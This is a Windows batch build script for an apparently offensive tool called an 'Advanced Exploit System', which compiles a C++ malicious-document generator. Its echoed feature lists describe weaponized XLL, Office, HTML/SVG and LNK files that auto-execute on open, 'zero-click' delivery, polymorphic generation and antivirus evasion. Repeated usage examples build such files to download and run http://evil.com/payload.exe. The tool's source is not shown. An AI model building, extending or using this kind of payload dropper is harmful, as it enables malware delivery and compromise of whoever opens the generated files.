@echo off
echo Advanced Exploit System - Comprehensive Exploit Generation Framework
echo ===================================================================

echo.
echo Building advanced exploit system...
echo.

REM Check for Visual Studio compiler
where cl >nul 2>&1
if %errorlevel% equ 0 (
    echo Found Visual Studio compiler
    echo Building with Visual Studio...
    echo.
    
    REM Build the advanced exploit system
    cl /std:c++17 /O2 /MT /EHsc ^
       advanced_exploit_system.cpp ^
       /Fe:advanced_exploit_system.exe ^
       /link wininet.lib wincrypt.lib psapi.lib
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced exploit system built successfully with Visual Studio!
        echo.
        echo Features:
        echo - XLL (Excel Add-in) Exploits
        echo - Document Exploits (DOCX, XLSX, PPTX)
        echo - HTML/SVG Exploits
        echo - LNK/URL Exploits
        echo - Office Macro Exploits
        echo - Zero-Click Exploits
        echo - Anti-Detection Evasion
        echo - Polymorphic Exploit Generation
        echo.
        echo Usage Examples:
        echo   advanced_exploit_system.exe xll http://evil.com/payload.exe exploit.xll --zero-click
        echo   advanced_exploit_system.exe docx http://evil.com/payload.exe exploit.docx --content "Important Document"
        echo   advanced_exploit_system.exe html http://evil.com/payload.exe exploit.html --zero-click --bypass
        echo   advanced_exploit_system.exe xlsx http://evil.com/payload.exe exploit.xlsx --polymorphic
    ) else (
        echo ✗ Visual Studio build failed
        goto try_mingw
    )
) else (
    echo Visual Studio compiler not found, trying MinGW...
    goto try_mingw
)

:try_mingw
REM Check for MinGW compiler
where g++ >nul 2>&1
if %errorlevel% equ 0 (
    echo Found MinGW compiler
    echo Building with MinGW...
    echo.
    
    REM Build the advanced exploit system
    g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
        advanced_exploit_system.cpp ^
        -o advanced_exploit_system.exe ^
        -lwininet -lcrypt32 -lpsapi
    
    if %errorlevel% equ 0 (
        echo ✓ Advanced exploit system built successfully with MinGW!
        echo.
        echo Features:
        echo - XLL (Excel Add-in) Exploits
        echo - Document Exploits (DOCX, XLSX, PPTX)
        echo - HTML/SVG Exploits
        echo - LNK/URL Exploits
        echo - Office Macro Exploits
        echo - Zero-Click Exploits
        echo - Anti-Detection Evasion
        echo - Polymorphic Exploit Generation
        echo.
        echo Usage Examples:
        echo   advanced_exploit_system.exe xll http://evil.com/payload.exe exploit.xll --zero-click
        echo   advanced_exploit_system.exe docx http://evil.com/payload.exe exploit.docx --content "Important Document"
        echo   advanced_exploit_system.exe html http://evil.com/payload.exe exploit.html --zero-click --bypass
        echo   advanced_exploit_system.exe xlsx http://evil.com/payload.exe exploit.xlsx --polymorphic
    ) else (
        echo ✗ MinGW build failed
        echo.
        echo Please install either:
        echo 1. Visual Studio Build Tools
        echo 2. MinGW-w64
        echo.
        echo For Visual Studio: https://visualstudio.microsoft.com/downloads/
        echo For MinGW: https://www.mingw-w64.org/downloads/
    )
) else (
    echo No C++ compiler found!
    echo.
    echo Please install either:
    echo 1. Visual Studio Build Tools
    echo 2. MinGW-w64
    echo.
    echo For Visual Studio: https://visualstudio.microsoft.com/downloads/
    echo For MinGW: https://www.mingw-w64.org/downloads/
)

echo.
echo ================================================
echo Advanced Exploit System Features:
echo ================================================
echo ✓ XLL (Excel Add-in) Exploits
echo   - Excel external references
echo   - Auto-execution on open
echo   - Polymorphic content generation
echo   - Anti-detection evasion
echo.
echo ✓ Document Exploits
echo   - DOCX with embedded hyperlinks
echo   - XLSX with HYPERLINK functions
echo   - PPTX with embedded content
echo   - Office macro integration
echo.
echo ✓ HTML/SVG Exploits
echo   - SVG script execution
echo   - JavaScript redirects
echo   - Zero-click capabilities
echo   - Cross-browser compatibility
echo.
echo ✓ LNK/URL Exploits
echo   - Windows shortcut files
echo   - Internet shortcuts
echo   - Auto-execution on click
echo   - Icon customization
echo.
echo ✓ Zero-Click Exploits
echo   - Automatic execution
echo   - Multiple redirect techniques
echo   - Fallback mechanisms
echo   - Stealth delivery
echo.
echo ✓ Anti-Detection Features
echo   - Polymorphic generation
echo   - Junk data insertion
echo   - Signature evasion
echo   - Dynamic content
echo.

pause